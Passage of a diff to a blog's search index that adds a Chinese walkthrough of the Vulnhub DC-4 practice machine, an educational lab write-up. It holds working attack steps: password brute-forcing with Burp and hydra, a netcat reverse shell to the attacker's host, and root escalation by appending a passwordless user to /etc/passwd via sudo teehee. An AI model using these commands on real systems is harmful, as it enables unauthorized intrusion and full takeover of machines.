@@ -162,7 +162,7 @@
     <url>/2022/06/09/Vulnhub-DC-2/</url>
     <content><![CDATA[<h1 id="一、环境搭建"><a href="#一、环境搭建" class="headerlink" title="一、环境搭建"></a>一、环境搭建</h1><blockquote>
 <p>攻击机：Kali-2021.3：192.168.8.105</p>
-<p>靶机：Vulnhub-DC2：192.168.8.222</p>
+<p>靶机：Vulnhub-DC-2：192.168.8.222</p>
 <p>靶机下载地址：<a href="https://download.vulnhub.com/dc/DC-2.zip">https://download.vulnhub.com/dc/DC-2.zip</a></p>
 </blockquote>
 <h1 id="二、信息收集"><a href="#二、信息收集" class="headerlink" title="二、信息收集"></a>二、信息收集</h1><p>首先使用nmap进行主机探活</p>
@@ -1713,6 +1713,139 @@
       <tags>
         <tag>web</tag>
         <tag>文件包含</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Vulnhub-DC-4渗透学习</title>
+    <url>/2022/07/04/Vulnhub-DC-4/</url>
+    <content><![CDATA[<h1 id="一、环境搭建"><a href="#一、环境搭建" class="headerlink" title="一、环境搭建"></a>一、环境搭建</h1><blockquote>
+<p>攻击机：Kali-2021.3：192.168.8.105</p>
+<p>靶机：Vulnhub-DC-4：192.168.8.168</p>
+</blockquote>
+<h1 id="二、信息收集"><a href="#二、信息收集" class="headerlink" title="二、信息收集"></a>二、信息收集</h1><p>主机探活</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -sP 192.168.8.0/24</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/07/04/Vulnhub-DC-4/1.png" alt></p>
+<p>扫描靶机ip</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -A -p- 192.168.8.168</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/07/04/Vulnhub-DC-4/2.png" alt></p>
+<p>发现开放了22和80端口，把信息都记录起来</p>
+<p>继续收集信息</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">whatweb 192.168.8.168:80</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/07/04/Vulnhub-DC-4/3.png" alt></p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nikto -host 192.168.8.168</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/07/04/Vulnhub-DC-4/4.png" alt></p>
+<p>nikto是kali自带的工具，用于扫描网站后台文件</p>
+<p>扫描完后发现并没有什么有用的信息了，也没有发现网站的框架、CMS等有用的信息</p>
+<h1 id="三、实战"><a href="#三、实战" class="headerlink" title="三、实战"></a>三、实战</h1><p>先尝试访问IP的80端口</p>
+<p><img src="/2022/07/04/Vulnhub-DC-4/5.png" alt></p>
+<p>发现是个登录入口，查看源代码，感觉就只是一个简单的登录窗口</p>
+<p><img src="/2022/07/04/Vulnhub-DC-4/6.png" alt></p>
+<p>既然是一个登录页面，尝试一下弱口令爆破吧，单独对密码进行爆破，字典使用Burp自带的</p>
+<p><img src="/2022/07/04/Vulnhub-DC-4/7.png" alt></p>
+<p><img src="/2022/07/04/Vulnhub-DC-4/8.png" alt></p>
+<p>爆破完之后发现密码为：happy</p>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>得到的账号密码</p>
+<blockquote>
+<p>admin</p>
+<p>happy</p>
+</blockquote>
+<p>回到登录页面进行登录，第一次登录后页面并没有改变，再次登录后才能登录成功</p>
+<p><img src="/2022/07/04/Vulnhub-DC-4/9.png" alt></p>
+<p>随便试试，发现里面可以执行命令，怀疑有命令执行的漏洞</p>
+<p><img src="/2022/07/04/Vulnhub-DC-4/10.png" alt></p>
+<p>把数据包拦截可以看到确实有命令执行</p>
+<p><img src="/2022/07/04/Vulnhub-DC-4/11.png" alt></p>
+<p>既然是命令执行，为了方便我们的操作，反弹一下shell吧</p>
+<p>kali开启监听</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nc -lvp 2222</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/07/04/Vulnhub-DC-4/12.png" alt></p>
+<p>然后在目标上执行</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nc -e /bin/bash 192.168.8.105 2222</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/07/04/Vulnhub-DC-4/13.png" alt></p>
+<p>成功拿到shell</p>
+<p><img src="/2022/07/04/Vulnhub-DC-4/14.png" alt></p>
+<p>再利用python得到交互式shell</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python -c &#x27;import pty; pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/07/04/Vulnhub-DC-4/15.png" alt></p>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>我们都知道，flag大概率在root中，但很明显我们的权限不够，需要提权</p>
+<ol>
+<li><p>SUID提权</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">find / -user root -perm -4000 -print 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/07/04/Vulnhub-DC-4/16.png" alt></p>
+<p>但是并没有常见的可提权的文件，比如：</p>
+<blockquote>
+<p>nmap、vim、find、bash、more、less、nano、cp</p>
+</blockquote>
+</li>
+<li><p>免密使用的root级别命令</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/07/04/Vulnhub-DC-4/17.png" alt></p>
+<p>但是发现需要密码，而我们没有密码，也行不通</p>
+</li>
+</ol>
+<p>好像走到尽头了，但别忘了我们扫到它的ssh端口是开放的，因此去寻找一下存在的ssh用户</p>
+<p><img src="/2022/07/04/Vulnhub-DC-4/18.png" alt></p>
+<p>发现存在三个用户</p>
+<p>分别进去查看一下有什么文件，发现里面只有jim用户里存有文件，然后就是不断的寻找有用的文件了，最终发现了一个存有密码的文件</p>
+<p><img src="/2022/07/04/Vulnhub-DC-4/19.png" alt></p>
+<p><img src="/2022/07/04/Vulnhub-DC-4/20.png" alt></p>
+<p>那接下来思路就很明确了，爆破这个用户就行了</p>
+<p>首先将密码保存到本机的passwd.txt中，用户名就jim一个就行</p>
+<p><img src="/2022/07/04/Vulnhub-DC-4/21.png" alt></p>
+<p>然后利用hydra进行爆破</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">hydra 192.168.8.168 -L user.txt -P passwd.txt ssh</span><br></pre></td></tr></table></figure>
+<p>成功获得jim的密码</p>
+<blockquote>
+<p>jibril04</p>
+</blockquote>
+<p><img src="/2022/07/04/Vulnhub-DC-4/22.png" alt></p>
+<p>接着利用刚刚的账号密码连接ssh进行登录</p>
+<p><img src="/2022/07/04/Vulnhub-DC-4/23.png" alt></p>
+<p>成功登录，而且出现了一段文字，翻译一下</p>
+<blockquote>
+<p>Linux dc-4 4.9.0-3-686 #1 SMP Debian 4.9.30-2+deb9u5 (2017-09-19) i686</p>
+<p>Debian GNU/Linux 系统中包含的程序是免费软件；<br>每个程序的确切分配条款在<br>/usr/share/doc/*/copyright 中的单个文件。</p>
+<p>Debian GNU/Linux 绝对没有担保，在某种程度上<br>适用法律允许。<br>你有新邮件。</p>
+</blockquote>
+<p>似乎是这个系统在每个用户登录的时候发给他的通知，在最下面可以看到说jim收到了一封新邮件，那我们就去寻找一下这封邮件看看，在var目录下发现了mail</p>
+<p><img src="/2022/07/04/Vulnhub-DC-4/24.png" alt></p>
+<p><img src="/2022/07/04/Vulnhub-DC-4/25.png" alt></p>
+<p>翻译看看就能发现里面有另一个用户charles的密码</p>
+<blockquote>
+<p>^xHhA&amp;hvim0y</p>
+</blockquote>
+<p>现在我们可以切换目录了，但是先测试一下jim用户能不能利用SUID提权和免密使用root命令</p>
+<p><img src="/2022/07/04/Vulnhub-DC-4/26.png" alt></p>
+<p>但是都没有成功，那就切换到charles用户试试</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">su charles</span><br></pre></td></tr></table></figure>
+<p>成功切换用户，然后继续尝试上面两种提权方式</p>
+<p><img src="/2022/07/04/Vulnhub-DC-4/27.png" alt></p>
+<p>发现了一个可以免密使用的root命令：teehee</p>
+<p>百度一下就知道这是一个编辑器，可以用来提权</p>
+<p><a href="https://www.cnblogs.com/zlgxzswjy/p/16118468.html">teehee 提权 - 隐念笎 - 博客园</a></p>
+<p>提权思路就是利用teehee的root权限在passwd中写入一个免密的root权限用户</p>
+<p>使用echo 命令与 sudo 命令配合使用，可以实现向那些只有系统管理员才有权限操作的文件中写入信息</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo &quot;abab::0:0:::/bin/bash&quot; | sudo teehee -a /etc/passwd</span><br><span class="line">cat /etc/passwd</span><br></pre></td></tr></table></figure>
+<p><img src="/2022/07/04/Vulnhub-DC-4/28.png" alt></p>
+<blockquote>
+<p>passwd文件解读：（简单理解这个即可）<br><code>root:x:0:0::/home/admin:/bin/bash</code><br>[用户名]：[密码]：[UID]：[GID]：[身份描述]：[主目录]：[登录shell]<br>“-a” 选项的作用等同于 “&gt;&gt;” 命令<br>【额外补充：没有给新用户创建密码是因为你创建了也没有用，因为第2个位置是密码占位符，是占位符！！】</p>
+</blockquote>
+<p>然后切换到我们新添加的用户名</p>
+<p>成功拿到root权限，后面就进入root目录，就能成功得到flag</p>
+<p><img src="/2022/07/04/Vulnhub-DC-4/29.png" alt></p>
+<p><img src="/2022/07/04/Vulnhub-DC-4/30.png" alt></p>
+<h1 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h1><p><a href="https://blog.csdn.net/m0_62094846/article/details/125535798">DC4-靶机</a></p>
+<p><a href="https://blog.csdn.net/qq_61237064/article/details/123594413?spm=1001.2014.3001.5502">dc-4 靶机渗透学习</a></p>
+<p><a href="https://zhuanlan.zhihu.com/p/397779150">黑客工具之hydra详细使用教程</a></p>
+<p><a href="https://www.cnblogs.com/backlion/p/10503978.html">编辑/etc/passwd文件进行权限升级的技巧</a></p>
+]]></content>
+      <categories>
+        <category>靶场&amp;靶机</category>
+      </categories>
+      <tags>
+        <tag>web</tag>
+        <tag>靶机</tag>
+        <tag>渗透测试</tag>
       </tags>
   </entry>
 </search>
